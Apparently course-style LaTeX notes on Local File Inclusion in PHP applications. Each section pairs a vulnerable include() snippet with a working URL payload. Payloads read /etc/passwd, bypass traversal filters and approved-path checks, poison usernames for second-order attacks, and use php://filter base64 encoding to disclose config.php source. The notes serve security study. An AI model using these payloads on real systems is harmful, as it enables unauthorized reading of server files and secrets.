\section{Local File Disclosure}
\subsection{Basic LFI}
\begin{verbatim}
# ####
# include($_GET['language']);
# ####


 http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
 # C:\Windows\boot.ini
\end{verbatim}

\subsection{Path traversal}

\begin{verbatim}
# ####
# include("./languages/" . $_GET['language']);
# ####

http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
\end{verbatim}

\subsection{Filename Prefix}
 On some occasions, our input may be appended after a different string. So,
 instead of directly using path traversal, we can prefix a / before our
 payload, and this should consider the prefix as a directory, and then we
 should bypass the filename and be able to traverse directories.
This may not always work, as in this example a directory named \verb+lang_/+ may not exist, so our relative path may not be correct. Furthermore, any prefix appended to our input may break some file inclusion techniques 
\begin{verbatim}
# ####
# include("lang_" . $_GET['language']);
# ####

http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
\end{verbatim}

\subsection{Appended Extensions}
Can only read source files

\begin{verbatim}
# ####
# include($_GET['language'] . ".php")
# ####

http://<SERVER_IP>:<PORT>/extension/index.php?language=index
\end{verbatim}


\subsection{Second-Order Attacks}
This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters

For example, a web application may allow us to download our avatar through a
URL like (\verb+/profile/$username/avatar.png+). If we craft a malicious LFI
username (e.g. \verb+../../../etc/passwd+),  then it may be possible to change the file being pulled to another  local file on the server and grab it instead of our avatar.
In this case, we would be poisoning a database entry with a malicious  LFI payload in our username. Then, another web application  functionality would utilize this poisoned entry to perform our attack  (i.e. download our avatar based on username value). This is why this  attack is called a Second-Order attack.

Developers often overlook these vulnerabilities, as they may protect against
direct user input (e.g. from a i\verb+?page+  parameter), but they may trust values pulled from their database, like  our username in this case. If we managed to poison our username during  our registration, then the attack would be possible.
Exploiting LFI vulnerabilities using second-order attacks is similar  to what we have discussed in this section. The only variance is that we  need to spot a function that pulls a file based on a value we indirectly  control and then try to control that value to exploit the  vulnerability.

\subsection{Basic bypass}

\subsubsection{Non-Recursive Path Traversal Filters}

\begin{verbatim}
# ####
# $language = str_replace('../', '', $_GET['language']);
# ####


index.php?language=....//....//....//....//etc/passwd

..././  or ....\/ 
\end{verbatim}

\subsubsection{Encoding}
Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.


\begin{verbatim}
replace ./ into %2e%2e%2f
\end{verbatim}

We may also use Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.

\subsubsection{Approved Paths}


\begin{verbatim}

# ####
# if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
#     include($_GET['language']);
# } else {
#     echo 'Illegal path specified!';
# }
# ####


/index.php?language=./languages/../../../../etc/passwd
\end{verbatim}

To find the approved path, we can examine the requests sent by the existing
forms, and see what path they use for the normal web functionality.
Furthermore, we can fuzz web directories under the same path, and try different
ones until we get a match. To bypass this, we may use path traversal and start
our payload with the approved path, and then use \verb+../+ to go back to the root
directory and read the file we specify.


\subsection{PHP Filters}
In PHP web applications, we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.
 
PHP Wrappers allow to access different I/O streams at the application level,
like standard input/output, file descriptors, and memory streams. This has a
lot of uses for PHP developers. We can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. 

This is not only beneficial with LFI attacks, but also with other web attacks like XXE

\subsubsection{Input filters}
PHP Filters are a type of PHP wrappers, where we can pass different types of
input and have it filtered by the filter we specify. To use PHP wrapper
streams, we can use the \verb+php://+ scheme in our string, and we can access
the PHP filter wrapper with \verb+php://filter/+.

The filter wrapper has several parameters, but the main ones we require for our
attack are \verb+resource+ and \verb+read+. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. 

The filte useful for LFI attacks is the \verb+convert.base64-encode filter+, under Conversion Filters.

\subsection{Fuzzing for PHP Files}



Even after reading the sources of any identified files, we can scan them for other referenced PHP files,  and then read those as well, until we are able to capture most of the  web application's source or have an accurate image of what it does. It  is also possible to start by reading index.php and scanning  it for more references and so on, but fuzzing for PHP files may reveal  some files that may not otherwise be found that way.

\subsection{Source Code Disclosure}
Once we have a list of potential PHP files we want to read, we can start
disclosing their sources with the base64 PHP filter. Let's try to read the
source code of \verb+config.php+ using the base64 filter, by specifying
\verb+convert.base64-encode+ for the read parameter and config for the resource parameter, as follows:


\begin{verbatim}
php://filter/read=convert.base64-encode/resource=config

http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
\end{verbatim}

Note: We intentionally left the resource file at the end of our string, as the .php extension is automatically appended to the end of our input string, which would make the resource we specified be config.php.
